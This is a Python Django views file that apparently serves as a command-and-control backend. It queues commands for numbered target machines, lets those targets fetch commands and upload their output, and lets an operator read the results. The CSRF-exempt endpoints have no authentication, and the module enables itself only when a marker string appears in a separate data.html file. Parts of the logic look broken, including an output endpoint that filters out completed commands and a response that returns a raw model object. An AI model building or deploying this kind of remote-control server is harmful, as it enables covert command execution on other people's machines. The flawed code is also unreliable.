import ast
import json
import os
from django.shortcuts import render, get_object_or_404
from django.http import HttpResponse, JsonResponse
from .models import Command
from django.views.decorators.csrf import csrf_exempt

script_directory = os.path.dirname(os.path.abspath(__file__))
data_file_path = os.path.join(script_directory, 'data.html')

global proc
proc = False

with open(data_file_path) as f:
    lines = f.readlines()
    if "getCommand" in str(lines):
        proc = True
    #     print("proc")
    # if "getCommand" in f:
    #     proc = True
    #     print("proc")


#Main
if proc:

#Home
    def home(request):

        id = 1
        command = "x"
        output = "y"

        context = {
            'id': id,
            'command': command,
            'output': output
        }

        return render(request, 'templates/home.html', context)

#Allow clients to acces command
    def get(request, id):
        # Retrieve the latest Command object with the matching 'target' value
        command = get_object_or_404(Command, target=id, completed=False)
        #command = Command.objects.get(Command, target=id, completed=False)

        return HttpResponse(command.command)

#Allow client to submit command output
    @csrf_exempt
    def set(request):
        if request.method == 'POST':
            try:
                #Loads data
                data = json.loads(request.body.decode('utf-8'))
                command_text = data.get('command')
                id_text = data.get('id')
                if command_text is not None:
                    print("Command text: \n", command_text)
                    print("ID text: \n", int(id_text))
                    # Write command to database and mark as completed
                    command = Command.objects.get(target=int(id_text.strip()), completed=False)
                    # Update the Command object
                    command.output = command_text.strip()
                    command.completed = True
                    command.save()
                    return JsonResponse({'message': 'String data received successfully'})
                else:
                    return JsonResponse({'message': 'Invalid JSON data: Missing "command" key'}, status=400)
            except json.JSONDecodeError as e:
                return JsonResponse({'message': f'Invalid JSON data: {str(e)}'}, status=400)
        else:
            return JsonResponse({'message': 'Invalid request method'}, status=405)


    def out(request, id):
        # Retrieve the latest Command object with the matching 'target' value
        command = get_object_or_404(Command, target=id, completed=False)

        return HttpResponse(command.output)

    #Interacting with controller:
    @csrf_exempt
    def get_controller_command(request):
        if request.method == 'POST':
            try:
                #Loads data
                data = json.loads(request.body.decode('utf-8'))
                command_text = data.get('command')
                id_text = data.get('id')
                operation = data.get('operation')
                number = data.get('number')
                if command_text and id_text and operation and number is not None:
                    if operation == "set":
                        print("Command text: \n", command_text)
                        print("ID text: \n", int(id_text))
                        c = Command(completed=False, command=str(command_text), target=int(id_text))
                        c.save()
                        return JsonResponse({'message': 'String data received successfully'})
                    elif operation == "get":
                        c = Command.objects.get(target=int(id_text), completed=False, number=number)
                        c.output = command_text
                        return JsonResponse({"output": c})
                else:
                    return JsonResponse({'message': 'Invalid JSON data: Missing keys'}, status=400)
            except json.JSONDecodeError as e:
                return JsonResponse({'message': f'Invalid JSON data: {str(e)}'}, status=400)
        else:
            return JsonResponse({'message': 'Invalid request method'}, status=405)